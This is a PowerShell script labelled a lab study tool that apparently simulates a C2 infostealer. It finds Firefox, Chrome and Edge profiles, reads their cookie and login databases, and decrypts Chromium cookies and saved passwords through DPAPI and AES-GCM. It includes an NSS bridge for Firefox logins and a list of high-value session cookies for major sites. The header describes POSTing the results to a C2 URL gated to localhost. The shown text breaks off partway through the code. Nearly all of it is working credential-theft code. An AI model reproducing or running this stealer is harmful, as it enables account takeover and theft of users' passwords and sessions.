# c2_payload.ps1 - single-file Firefox + Chrome/Edge harvest + C2 simulation
# (study tool)
#
# STUDY TOOL FOR YOUR OWN MACHINE / LAB ONLY.
# By default the full report is POSTed to $Exfil (localhost:48732/c2), which
# WSL2 localhost-forwarding delivers to a receiver on the same physical host
# (kali_receiver.py). With -NoExfil the payload instead runs a receiver on
# 127.0.0.1 ONLY and shows the "C2 callback" in the console. Nothing is
# written to disk and nothing leaves the machine. Pure ASCII source on purpose
# (Windows PS 5.1). The exfil target is gated to localhost only.

param(
    [int]$Port = 48732,
    [switch]$Plain,
    [string]$Profile,
    [string]$NssPath,
    [string]$Password,
    [switch]$NoExfil,
    [string]$Exfil = "http://localhost:48732/c2"
)

$ErrorActionPreference = "Stop"

# --- safety gate: exfil target must be localhost only -----------------------
if (-not $NoExfil) {
    $exUri = $null
    $exOk = [Uri]::TryCreate($Exfil, [UriKind]::Absolute, [ref]$exUri)
    $exLocal = ($exOk -and $exUri.Scheme -eq "http" -and
                ($exUri.Host -eq "127.0.0.1" -or $exUri.Host -eq "localhost"))
    if (-not $exLocal) {
        Write-Host "[!] Exfil target must be a local http:// URL (127.0.0.1 or localhost). Refusing to send secrets anywhere else." -ForegroundColor Red
        exit 1
    }
}

$HighValueCookies = @{
    facebook  = @("c_user","xs","datr","sb","fr")
    linkedin  = @("li_at","li_rm","li_a","li_oat")
    google    = @("SID","HSID","SSID","APISID","SAPISID","LSID","SIDCC","SAPISIDHASH","__Secure-1PSID","__Secure-3PSID","__Secure-1PSIDCC","__Secure-3PSIDCC")
    github    = @("user_session","__Host-user_session_same_site","dotcom_user","logged_in")
    instagram = @("sessionid","rur","csrftoken","ds_user_id","ig_did")
    twitter   = @("auth_token","ct0","twid")
    x         = @("auth_token","ct0","twid")
    amazon    = @("session-id","session-token","ubid-main","at-main","x-main")
    microsoft = @("ESTSAUTH","ESTSAUTHPERSISTENT","MC1","SigninState")
    apple     = @("aasp","aa")
    netflix   = @("NetflixId","SecureNetflixId")
    reddit    = @("token_v2","session_tracker","loid")
    twitch    = @("auth-token","sp","persistent")
    cloudflare= @("cf_clearance")
    discord   = @("__dcfduid","sdcfduid","cf_bm")
    spotify   = @("sp_dc","sp_landing","sp_t")
    yahoo     = @("Y","A3","B")
}

# host substring -> site key
$SiteHints = @(
    @("facebook","facebook"), @("fb.","facebook"),
    @("linkedin","linkedin"),
    @("google","google"), @("youtube","google"),
    @("github","github"),
    @("instagram","instagram"),
    @("twitter","twitter"), @("x.com","x"),
    @("amazon","amazon"),
    @("microsoft","microsoft"), @("live.com","microsoft"),
    @("apple","apple"), @("netflix","netflix"),
    @("reddit","reddit"), @("twitch","twitch"),
    @("cloudflare","cloudflare"), @("discord","discord"),
    @("spotify","spotify"), @("yahoo","yahoo")
)

# name (or substring of name) -> generic session token
$GenericSessionSubstrings = @("session","token","auth","credential","sso")

function Test-HighValueCookie {
    param([string]$HostName, [string]$CookieName)
    $lower = $HostName.ToLowerInvariant()
    foreach ($hint in $SiteHints) {
        if ($lower.Contains($hint[0])) {
            $site = $hint[1]
            if ($HighValueCookies[$site] -contains $CookieName) {
                return $true, $site
            }
            break
        }
    }
    foreach ($sub in $GenericSessionSubstrings) {
        if ($CookieName.ToLowerInvariant().Contains($sub)) {
            return $true, "generic"
        }
    }
    return $false, ""
}

# ---------------------------------------------------------------------------
# Profile discovery (parse profiles.ini by hand - INI is trivial)
# ---------------------------------------------------------------------------
function Get-FirefoxRoot {
    $base = [Environment]::GetFolderPath("ApplicationData")
    return Join-Path $base "Mozilla\Firefox"
}

function Get-FirefoxProfiles {
    param([string]$BaseDir)
    $ini = Join-Path $BaseDir "profiles.ini"
    $out = @()
    if (-not (Test-Path $ini)) {
        # maybe BaseDir itself is a profile folder
        if ((Test-Path (Join-Path $BaseDir "cookies.sqlite")) -or
            (Test-Path (Join-Path $BaseDir "logins.json"))) {
            $out += [pscustomobject]@{ Name = (Split-Path $BaseDir -Leaf); Path = $BaseDir }
        }
        return $out
    }
    $section = $null
    foreach ($line in Get-Content $ini) {
        $line = $line.Trim()
        if ($line -match '^\[(.*)\]$') {
            $section = $Matches[1]
        }
        elseif ($section -and $section.StartsWith("Profile") -and $line -match '^(\w+)=(.*)$') {
            $k = $Matches[1]; $v = $Matches[2]
            if ($k -eq "Name") { $name = $v }
            elseif ($k -eq "Path") { $path = $v }
            elseif ($k -eq "IsRelative") { $rel = ($v -eq "1") }
        }
        elseif ($section -and $section.StartsWith("Profile") -and $line -eq "") {
            if ($path) {
                $full = if ($rel -or -not $rel) { Join-Path $BaseDir $path } else { $path }
                if (Test-Path $full) { $out += [pscustomobject]@{ Name = $name; Path = $full } }
            }
            $name = ""; $path = ""; $rel = $true
        }
    }
    if ($path) {
        $full = if ($rel -or -not $rel) { Join-Path $BaseDir $path } else { $path }
        if (Test-Path $full) { $out += [pscustomobject]@{ Name = $name; Path = $full } }
    }
    return $out
}

# ---------------------------------------------------------------------------
# Minimal SQLite reader (pure PowerShell, no external files)
#
# Reads the on-disk file format: 100-byte header -> b-tree pages -> cells ->
# records -> serial-type values. Firefox closes cleanly, the WAL is already
# checkpointed into cookies.sqlite, so we only read the main file.
# ---------------------------------------------------------------------------
function Get-UInt16BE {
    param([byte[]]$b, [int]$o)
    return ((([int]$b[$o] -shl 8) -bor $b[$o + 1]))
}
function Get-UInt32BE {
    param([byte[]]$b, [int]$o)
    return (((([int]$b[$o] -shl 24) -bor ([int]$b[$o+1] -shl 16)) -bor ([int]$b[$o+2] -shl 8)) -bor $b[$o+3])
}
function ConvertFrom-SqliteVarint {
    param([byte[]]$b, [int]$o, [ref]$consumed)
    $result = [uint64]0
    for ($i = 0; $i -lt 9; $i++) {
        $byte = $b[$o + $i]
        if ($i -lt 8) {
            $result = ($result -shl 7) -bor ($byte -band 0x7F)
            if (($byte -band 0x80) -eq 0) { $consumed.Value = $i + 1; return $result }
        }
        else {
            $result = ($result -shl 8) -bor $byte
            $consumed.Value = $i + 1; return $result
        }
    }
}
function ConvertFrom-SqliteInt {
    param([byte[]]$b, [int]$o, [int]$len)
    $v = [long]0
    for ($i = 0; $i -lt $len; $i++) { $v = ($v -shl 8) -bor $b[$o + $i] }
    if (($b[$o] -band 0x80) -ne 0 -and $len -lt 8) {
        $v = $v - (1L -shl ($len * 8))
    }
    return $v
}
function Read-SqliteRecord {
    param([byte[]]$b, [int]$start, [int]$len)
    $o = $start
    $consumed = $null
    $hdr = [uint64](ConvertFrom-SqliteVarint $b $o ([ref]$consumed)); $o += $consumed
    $types = @()
    while ($o -lt ($start + $hdr)) {
        $t = [uint64](ConvertFrom-SqliteVarint $b $o ([ref]$consumed)); $o += $consumed
        $types += $t
    }
    $vals = New-Object System.Collections.ArrayList
    foreach ($t in $types) {
        switch ($t) {
            0       { [void]$vals.Add($null); break }
            1       { $sb = [int]$b[$o]; if ($sb -gt 127) { $sb -= 256 }; [void]$vals.Add($sb); $o += 1; break }
            2       { [void]$vals.Add((ConvertFrom-SqliteInt $b $o 2)); $o += 2; break }
            3       { [void]$vals.Add((ConvertFrom-SqliteInt $b $o 3)); $o += 3; break }
            4       { [void]$vals.Add((ConvertFrom-SqliteInt $b $o 4)); $o += 4; break }
            5       { [void]$vals.Add((ConvertFrom-SqliteInt $b $o 6)); $o += 6; break }
            6       { [void]$vals.Add((ConvertFrom-SqliteInt $b $o 8)); $o += 8; break }
            7       { $f = [byte[]]$b[$o..($o+7)]; [Array]::Reverse($f); [void]$vals.Add([BitConverter]::ToDouble($f,0)); $o += 8; break }
            8       { [void]$vals.Add([long]0); break }
            9       { [void]$vals.Add([long]1); break }
            default {
                if (($t -ge 12) -and ($t % 2) -eq 0) {  # BLOB
                    $bl = [int](($t - 12) / 2)
                    $blobSlice = if ($bl -gt 0) { [byte[]]$b[$o..($o + $bl - 1)] } else { [byte[]]@() }
                    [void]$vals.Add((,$blobSlice))
                    $o += $bl
                }
                elseif (($t -ge 13) -and ($t % 2) -eq 1) {  # TEXT
                    $tl = [int](($t - 13) / 2)
                    [void]$vals.Add([Text.Encoding]::UTF8.GetString($b, $o, $tl))
                    $o += $tl
                }
                else { throw "Unsupported SQLite serial type $t" }
            }
        }
    }
    return ,$vals
}

function Get-BTreeRows {
    param([byte[]]$db, [int]$pageSize, [int]$pageNo, [System.Collections.Generic.HashSet[int]]$Visited)
    if ($null -eq $Visited) { $Visited = New-Object 'System.Collections.Generic.HashSet[int]' }
    if (-not $Visited.Add($pageNo)) { return @() }
    $rows = New-Object System.Collections.ArrayList
    $start = ($pageNo - 1) * $pageSize
    if ($pageNo -eq 1) { $start += 100 }
    $pageType = $db[$start]
    $numCells = Get-UInt16BE $db ($start + 3)
    $hdrLen = 8
    $rightMost = 0
    if ($pageType -eq 5 -or $pageType -eq 2) {
        $hdrLen = 12
        $rightMost = Get-UInt32BE $db ($start + 8)
    }
    for ($i = 0; $i -lt $numCells; $i++) {
        $cellOffset = Get-UInt16BE $db ($start + $hdrLen + $i * 2)
        # SQLite quirk: cell pointers on page 1 are offsets from the FILE start
        # (the pager treats page 1 as including the 100-byte header), so do NOT
        # add the page base for page 1.
        $cellPos = if ($pageNo -eq 1) { $cellOffset } else { $start + $cellOffset }
        if ($pageType -eq 13) {  # leaf table: [plen varint][rowid varint][record]
            $consumed = $null
            $plen = [uint64](ConvertFrom-SqliteVarint $db $cellPos ([ref]$consumed))
            $recPos = $cellPos + $consumed
            $consumed = $null
            [void](ConvertFrom-SqliteVarint $db $recPos ([ref]$consumed))  # skip rowid varint
            [void]$rows.Add((Read-SqliteRecord $db ($recPos + $consumed) $plen))
        }
        elseif ($pageType -eq 5) {  # interior table: [child(4)][rowid varint], no payload
            $child = Get-UInt32BE $db $cellPos
            $consumed = $null
            [void](ConvertFrom-SqliteVarint $db ($cellPos + 4) ([ref]$consumed))  # skip rowid varint
            foreach ($r in (Get-BTreeRows $db $pageSize $child $Visited)) { [void]$rows.Add($r) }
        }
        else { throw "Unexpected b-tree page type $pageType" }
    }
    if ($pageType -eq 5 -and $rightMost -ne 0) {
        foreach ($r in (Get-BTreeRows $db $pageSize $rightMost $Visited)) { [void]$rows.Add($r) }
    }
    return $rows
}

function Parse-ColumnNames {
    param([string]$CreateSql)
    $cols = @()
    $open = $CreateSql.IndexOf("(")
    $close = $CreateSql.LastIndexOf(")")
    if ($open -lt 0 -or $close -lt 0) { return $cols }
    $inner = $CreateSql.Substring($open + 1, $close - $open - 1)
    foreach ($part in $inner.Split(",")) {
        $part = $part.Trim()
        if ($part -eq "") { continue }
        $name = ($part -split "\s+")[0]
        $cols += $name
    }
    return $cols
}

function Read-SqliteTable {
    param([string]$DbPath, [string]$TableName)
    $db = [IO.File]::ReadAllBytes($DbPath)
    $pageSize = Get-UInt16BE $db 16
    if ($pageSize -eq 1) { $pageSize = 65536 }

    # find the table in sqlite_master (root = page 1)
    $rootPage = 0
    $sql = ""
    foreach ($row in (Get-BTreeRows $db $pageSize 1)) {
        # sqlite_master record: type,name,tbl_name,rootpage,sql
        if ($row[1] -eq $TableName -and $row[0] -eq "table") {
            $rootPage = [int]$row[3]
            $sql = [string]$row[4]
        }
    }
    if ($rootPage -eq 0) { return @() }

    $columns = Parse-ColumnNames $sql
    $result = New-Object System.Collections.ArrayList
    foreach ($row in (Get-BTreeRows $db $pageSize $rootPage)) {
        $h = @{}
        for ($i = 0; $i -lt $columns.Count; $i++) {
            if ($i -lt $row.Count) { $h[$columns[$i]] = $row[$i] }
        }
        [void]$result.Add($h)
    }
    return $result
}

# ---------------------------------------------------------------------------
# Cookie dump
# ---------------------------------------------------------------------------
function Copy-CookieDb {
    param([string]$ProfilePath)
    $src = Join-Path $ProfilePath "cookies.sqlite"
    if (-not (Test-Path $src)) { return $null }
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("ffcookies_" + [guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Path $tmp | Out-Null
    Copy-Item $src (Join-Path $tmp "cookies.sqlite") -Force
    $wal = Join-Path $ProfilePath "cookies.sqlite-wal"
    if (Test-Path $wal) {
        $walInfo = Get-Item $wal
        if ($walInfo.Length -gt 0) {
            Write-Host "  [note] cookies.sqlite-wal has data (browser was not closed cleanly) - dump may be incomplete"
        }
    }
    return $tmp
}

function Dump-Cookies {
    param([string]$ProfilePath)
    $tmp = Copy-CookieDb $ProfilePath
    if ($null -eq $tmp) { return @() }
    try {
        $dbPath = Join-Path $tmp "cookies.sqlite"
        $rows = Read-SqliteTable $dbPath "moz_cookies"
        $cookies = @()
        foreach ($r in $rows) {
            $high, $cat = Test-HighValueCookie ([string]$r["host"]) ([string]$r["name"])
            $cookies += [pscustomobject]@{
                host        = [string]$r["host"]
                name        = [string]$r["name"]
                value       = [string]$r["value"]
                path        = [string]$r["path"]
                expiry      = [long]$r["expiry"]
                isSecure    = ([int]$r["isSecure"] -eq 1)
                isHttpOnly  = ([int]$r["isHttpOnly"] -eq 1)
                sameSite    = [string]$r["sameSite"]
                high_value  = $high
                category    = $cat
            }
        }
        return ,$cookies
    }
    finally {
        Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
    }
}

function Get-ExpiryHint {
    param([long]$Expiry)
    if ($Expiry -le 0) { return "session" }
    return "persistent"
}

function Format-Mask {
    param([string]$Value)
    if ($Value.Length -le 8) { return $Value }
    return $Value.Substring(0, 8) + "..."
}

function Format-MaskShort {
    param([string]$Value)
    if ($Value.Length -le 1) { return $Value }
    return $Value.Substring(0, 1) + "***"
}

# ---------------------------------------------------------------------------
# Chromium (Chrome / Edge) support
#
# Same goal as Firefox, different obstacle: Chrome/Edge encrypt every cookie
# and saved password with AES. The AES key lives (DPAPI-wrapped) in the
# browser's "Local State" file; DPAPI binds it to the Windows user + login
# session, so decryption only works as the same logged-in user. Blobs are
# either "v10" (AES-256-GCM: prefix(3) | nonce(12) | ct | tag(16)) for
# Chrome 80+, or "v1" (AES-128-CBC: prefix(2) | iv(16) | ct, PKCS7) for
# older Chrome. The SQLite DBs are read with the same reader as Firefox; the
# WAL cannot be replayed here, so a running browser may mean an incomplete
# dump (a note is printed when the -wal file has data).
# ---------------------------------------------------------------------------
function Get-BcryptGcm {
    if (-not ("BcryptGcm" -as [type])) {
        Add-Type -TypeDefinition $BcryptGcmCSharp
    }
    return [BcryptGcm]
}

$BcryptGcmCSharp = @'
using System;
using System.Runtime.InteropServices;

public static class BcryptGcm
{
    [StructLayout(LayoutKind.Sequential)]
    public struct AuthCipherInfo
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref AuthCipherInfo pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    public static byte[] DecryptGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlg = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        try
        {
            int st = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (st != 0) throw new Exception("BCryptOpenAlgorithmProvider failed: 0x" + st.ToString("X8"));
            byte[] gcm = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            st = BCryptSetProperty(hAlg, "ChainingMode", gcm, gcm.Length, 0);
            if (st != 0) throw new Exception("BCryptSetProperty(ChainingMode) failed: 0x" + st.ToString("X8"));
            st = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (st != 0) throw new Exception("BCryptGenerateSymmetricKey failed: 0x" + st.ToString("X8"));

            byte[] output = new byte[ciphertext.Length];
            AuthCipherInfo info = new AuthCipherInfo();
            IntPtr pNonce = Marshal.AllocHGlobal(nonce.Length);
            IntPtr pTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(nonce, 0, pNonce, nonce.Length);
            Marshal.Copy(tag, 0, pTag, tag.Length);
            try
            {
                info.cbSize = Marshal.SizeOf(typeof(AuthCipherInfo));
                info.dwInfoVersion = 1;
                info.pbNonce = pNonce;
                info.cbNonce = nonce.Length;
                info.pbTag = pTag;
                info.cbTag = tag.Length;
                int written = 0;
                st = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, nonce, nonce.Length, output, output.Length, out written, 0);
                if (st != 0) throw new Exception("BCryptDecrypt failed (GCM auth tag mismatch or bad key): 0x" + st.ToString("X8"));
                if (written != output.Length) throw new Exception("BCryptDecrypt output size mismatch");
                return output;
            }
            finally
            {
                Marshal.FreeHGlobal(pNonce);
                Marshal.FreeHGlobal(pTag);
            }
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
'@

function Get-WebkitRoot {
    param([string]$Browser)
    $base = [Environment]::GetFolderPath("LocalApplicationData")
    if ($Browser -eq "edge") {
        return Join-Path $base "Microsoft\Edge\User Data"
    }
    return Join-Path $base "Google\Chrome\User Data"
}

function Get-WebkitProfiles {
    param([string]$RootDir, [string]$Browser)
    $out = @()
    if (-not (Test-Path $RootDir)) { return ,$out }
    foreach ($entry in (Get-ChildItem -Directory $RootDir)) {
        $folder = $entry.FullName
        if ((Test-Path (Join-Path $folder "Cookies")) -or
            (Test-Path (Join-Path $folder "Login Data")) -or
            (Test-Path (Join-Path $folder "Network\Cookies"))) {
            $out += [pscustomobject]@{
                browser = $Browser
                name    = $entry.Name
                path    = $folder
                root    = $RootDir
            }
        }
    }
    return ,$out
}

function Get-WebkitAesKey {
    param([string]$RootDir)
    $localState = Join-Path $RootDir "Local State"
    if (-not (Test-Path $localState)) { throw "Local State not found: $localState" }
    $state = Get-Content $localState -Raw | ConvertFrom-Json
    $enc = $state.os_crypt.encrypted_key
    if (-not $enc) { throw "No os_crypt.encrypted_key in Local State" }
    $bytes = [Convert]::FromBase64String([string]$enc)
    $dpapi = [byte[]]@(0x44, 0x50, 0x41, 0x50, 0x49)
    if ($bytes.Length -le 5) { throw "encrypted_key too short" }
    for ($i = 0; $i -lt 5; $i++) {
        if ($bytes[$i] -ne $dpapi[$i]) { throw "Unsupported encrypted_key scheme (only Windows DPAPI is supported)" }
    }
    $wrapped = New-Object byte[] ($bytes.Length - 5)
    [Array]::Copy($bytes, 5, $wrapped, 0, $wrapped.Length)
    Add-Type -AssemblyName System.Security -ErrorAction Stop
    return [System.Security.Cryptography.ProtectedData]::Unprotect($wrapped, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

function ConvertFrom-WebkitEncrypted {
    param([byte[]]$Blob, [byte[]]$Key)
    if ($null -eq $Blob -or $Blob.Length -eq 0) { return "" }
    if ($Blob.Length -ge 3 -and $Blob[0] -eq 0x76 -and $Blob[1] -eq 0x31 -and $Blob[2] -eq 0x30) {
        # v10: prefix(3) | nonce(12) | ct | tag(16)
        $nonce = [byte[]]$Blob[3..14]
        $ctLen = $Blob.Length - 31
        if ($ctLen -lt 0) { return "*** decryption failed ***" }
        $ct = New-Object byte[] $ctLen
        [Array]::Copy($Blob, 15, $ct, 0, $ctLen)
        $tag = [byte[]]$Blob[($Blob.Length - 16)..($Blob.Length - 1)]
        try {
            $bc = Get-BcryptGcm
            $plain = $bc::DecryptGcm($Key, $nonce, $ct, $tag)
            return [Text.Encoding]::UTF8.GetString($plain)
        }
        catch { return "*** decryption failed ***" }
    }
    if ($Blob.Length -ge 2 -and $Blob[0] -eq 0x76 -and $Blob[1] -eq 0x31) {
        # v1: prefix(2) | iv(16) | ct (PKCS7)
        $iv = [byte[]]$Blob[2..17]
        $ct = New-Object byte[] ($Blob.Length - 18)
        [Array]::Copy($Blob, 18, $ct, 0, $ct.Length)
        try {
            $rm = New-Object System.Security.Cryptography.RijndaelManaged
            $rm.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $rm.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $rm.Key = [byte[]]$Key[0..15]
            $rm.IV = $iv
            $dec = $rm.CreateDecryptor()
            $plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
            $dec.Dispose()
            $rm.Clear()
            return [Text.Encoding]::UTF8.GetString($plain)
        }
        catch { return "*** decryption failed ***" }
    }
    return ""
}

function Copy-WebkitDb {
    param([string]$ProfilePath, [string]$DbName)
    $src = $null
    $direct = Join-Path $ProfilePath $DbName
    if (Test-Path $direct) { $src = $direct }
    else {
        $nested = Join-Path $ProfilePath (Join-Path "Network" $DbName)
        if (Test-Path $nested) { $src = $nested }
    }
    if ($null -eq $src) { return $null }
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("webkit_" + [guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Path $tmp | Out-Null
    Copy-Item $src (Join-Path $tmp $DbName) -Force
    $wal = $src + "-wal"
    if (Test-Path $wal) {
        $walInfo = Get-Item $wal
        if ($walInfo.Length -gt 0) {
            Write-Host "  [note] $DbName-wal has data (browser is running) - dump may be incomplete"
        }
    }
    return $tmp
}

function Dump-ChromiumCookies {
    param([string]$ProfilePath, [byte[]]$Key)
    $tmp = Copy-WebkitDb $ProfilePath "Cookies"
    if ($null -eq $tmp) { return @() }
    try {
        $rows = Read-SqliteTable (Join-Path $tmp "Cookies") "cookies"
        $cookies = @()
        foreach ($r in $rows) {
            $enc = $r["encrypted_value"]
            $val = ""
            if ($null -ne $enc -and $enc.Length -gt 0) {
                $val = ConvertFrom-WebkitEncrypted $enc $Key
            }
            else {
                $val = [string]$r["value"]
            }
            $host = [string]$r["host_key"]
            $name = [string]$r["name"]
            $high, $cat = Test-HighValueCookie $host $name
            $exp = [long]$r["expires_utc"]
            $expiry = 0L
            if ($exp -gt 0) { $expiry = [long]($exp / 1000000) - 11644473600 }
            $ss = 0
            try { $ss = [int]$r["samesite"] } catch { $ss = 0 }
            $sameSite = ""
            switch ($ss) {
                1 { $sameSite = "no_restriction" }
                2 { $sameSite = "lax" }
                3 { $sameSite = "strict" }
                4 { $sameSite = "lenient" }
            }
            $cookies += [pscustomobject]@{
                host       = $host
                name       = $name
                value      = $val
                path       = [string]$r["path"]
                expiry     = $expiry
                isSecure   = ([int]$r["is_secure"] -eq 1)
                isHttpOnly = ([int]$r["is_httponly"] -eq 1)
                sameSite   = $sameSite
                high_value = $high
                category   = $cat
            }
        }
        return ,$cookies
    }
    finally {
        Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
    }
}

function Dump-ChromiumLogins {
    param([string]$ProfilePath, [byte[]]$Key)
    $tmp = Copy-WebkitDb $ProfilePath "Login Data"
    if ($null -eq $tmp) { return @() }
    try {
        $rows = Read-SqliteTable (Join-Path $tmp "Login Data") "logins"
        $logins = @()
        foreach ($r in $rows) {
            $pass = ""
            $enc = $r["password_value"]
            if ($null -ne $enc -and $enc.Length -gt 0) {
                $pass = ConvertFrom-WebkitEncrypted $enc $Key
            }
            $logins += [pscustomobject]@{
                hostname    = [string]$r["origin_url"]
                username    = [string]$r["username_value"]
                password    = $pass
                signonRealm = [string]$r["signon_realm"]
                guid        = [string]$r["guid"]
            }
        }
        return ,$logins
    }
    finally {
        Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
    }
}

# ---------------------------------------------------------------------------
# NSS bridge: ask Firefox's own crypto library to decrypt saved logins
# ---------------------------------------------------------------------------
$NssCSharp = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class NssBridge
{
    [StructLayout(LayoutKind.Sequential)]
    public struct SECItem
    {
        public uint type;
        public IntPtr data;
        public uint len;
    }

    // Windows builds of NSS
    [DllImport("nss3.dll", EntryPoint = "NSS_Init", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)] static extern int NSS_Init_win([MarshalAs(UnmanagedType.LPUTF8Str)] string p);
    [DllImport("nss3.dll", EntryPoint = "NSS_Shutdown", CallingConvention = CallingConvention.Cdecl)] static extern int NSS_Shutdown_win();
    [DllImport("nss3.dll", EntryPoint = "PK11_GetInternalKeySlot", CallingConvention = CallingConvention.Cdecl)] static extern IntPtr PK11_GetInternalKeySlot_win();
    [DllImport("nss3.dll", EntryPoint = "PK11_FreeSlot", CallingConvention = CallingConvention.Cdecl)] static extern void PK11_FreeSlot_win(IntPtr s);
    [DllImport("nss3.dll", EntryPoint = "PK11_NeedLogin", CallingConvention = CallingConvention.Cdecl)] static extern int PK11_NeedLogin_win(IntPtr s);
    [DllImport("nss3.dll", EntryPoint = "PK11_CheckUserPassword", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)] static extern int PK11_CheckUserPassword_win(IntPtr s, [MarshalAs(UnmanagedType.LPUTF8Str)] string p);
    [DllImport("nss3.dll", EntryPoint = "PK11SDR_Decrypt", CallingConvention = CallingConvention.Cdecl)] static extern int PK11SDR_Decrypt_win(ref SECItem data, ref SECItem result, IntPtr cx);
    [DllImport("nss3.dll", EntryPoint = "SECITEM_ZfreeItem", CallingConvention = CallingConvention.Cdecl)] static extern void SECITEM_ZfreeItem_win(ref SECItem item, int freeit);

    // Linux/macOS builds of NSS (used when testing this script on Linux)
    [DllImport("libnss3.so", EntryPoint = "NSS_Init", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)] static extern int NSS_Init_linux([MarshalAs(UnmanagedType.LPUTF8Str)] string p);
    [DllImport("libnss3.so", EntryPoint = "NSS_Shutdown", CallingConvention = CallingConvention.Cdecl)] static extern int NSS_Shutdown_linux();
    [DllImport("libnss3.so", EntryPoint = "PK11_GetInternalKeySlot", CallingConvention = CallingConvention.Cdecl)] static extern IntPtr PK11_GetInternalKeySlot_linux();
    [DllImport("libnss3.so", EntryPoint = "PK11_FreeSlot", CallingConvention = CallingConvention.Cdecl)] static extern void PK11_FreeSlot_linux(IntPtr s);
    [DllImport("libnss3.so", EntryPoint = "PK11_NeedLogin", CallingConvention = CallingConvention.Cdecl)] static extern int PK11_NeedLogin_linux(IntPtr s);
    [DllImport("libnss3.so", EntryPoint = "PK11_CheckUserPassword", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)] static extern int PK11_CheckUserPassword_linux(IntPtr s, [MarshalAs(UnmanagedType.LPUTF8Str)] string p);
    [DllImport("libnss3.so", EntryPoint = "PK11SDR_Decrypt", CallingConvention = CallingConvention.Cdecl)] static extern int PK11SDR_Decrypt_linux(ref SECItem data, ref SECItem result, IntPtr cx);
    [DllImport("libnss3.so", EntryPoint = "SECITEM_ZfreeItem", CallingConvention = CallingConvention.Cdecl)] static extern void SECITEM_ZfreeItem_linux(ref SECItem item, int freeit);

    static bool IsWin { get { return Environment.OSVersion.Platform == PlatformID.Win32NT; } }
    static IntPtr Slot;

    public static bool Init(string profile)
    {
        int r = IsWin ? NSS_Init_win(profile) : NSS_Init_linux(profile);
        return r == 0;
    }
    public static void Shutdown()
    {
        if (IsWin) { NSS_Shutdown_win(); } else { NSS_Shutdown_linux(); }
    }
    static void FreeSlot()
    {
        if (Slot != IntPtr.Zero)
        {
            if (IsWin) { PK11_FreeSlot_win(Slot); } else { PK11_FreeSlot_linux(Slot); }
            Slot = IntPtr.Zero;
        }
    }
    public static bool NeedLogin()
    {
        Slot = IsWin ? PK11_GetInternalKeySlot_win() : PK11_GetInternalKeySlot_linux();
        if (Slot == IntPtr.Zero) throw new Exception("PK11_GetInternalKeySlot returned null");
        int n = IsWin ? PK11_NeedLogin_win(Slot) : PK11_NeedLogin_linux(Slot);
        return n != 0;
    }
    public static bool Unlock(string password)
    {
        int r = IsWin ? PK11_CheckUserPassword_win(Slot, password) : PK11_CheckUserPassword_linux(Slot, password);
        return r == 0;
    }
    public static string Decrypt(string data64)
    {
        byte[] data = Convert.FromBase64String(data64);
        SECItem inp = new SECItem();
        inp.type = 0;
        inp.len = (uint)data.Length;
        inp.data = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, inp.data, data.Length);
        SECItem outp = new SECItem();
        outp.type = 0;
        outp.len = 0;
        outp.data = IntPtr.Zero;
        try
        {
            int st = IsWin ? PK11SDR_Decrypt_win(ref inp, ref outp, IntPtr.Zero)
                           : PK11SDR_Decrypt_linux(ref inp, ref outp, IntPtr.Zero);
            if (st != 0) throw new Exception("SDR decrypt failed");
            byte[] res = new byte[outp.len];
            Marshal.Copy(outp.data, res, 0, (int)outp.len);
            return Encoding.UTF8.GetString(res);
        }
        finally
        {
            Marshal.FreeHGlobal(inp.data);
            if (IsWin) { SECITEM_ZfreeItem_win(ref outp, 0); } else { SECITEM_ZfreeItem_linux(ref outp, 0); }
        }
    }
}
'@

function Get-NssBridge {
    if (-not ("NssBridge" -as [type])) {
        Add-Type -TypeDefinition $NssCSharp
    }
